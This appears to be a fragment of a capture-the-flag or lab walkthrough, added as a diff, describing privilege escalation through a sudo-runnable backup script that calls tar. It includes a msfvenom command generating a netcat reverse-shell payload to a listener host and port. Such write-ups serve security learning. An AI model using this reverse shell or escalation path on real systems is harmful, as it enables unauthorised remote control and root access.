@@ -1,0 +1,6 @@
+Ok, I checked what we can sudo: sudo -l
+We can sudo as another user script in /opt/backups/backup.sh. This script is running tar cf /opt/backups/backup.tar
+
+This script is taking a backup.tar of everything in backup directory. We create msfvenom 
+msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=8888 R
+
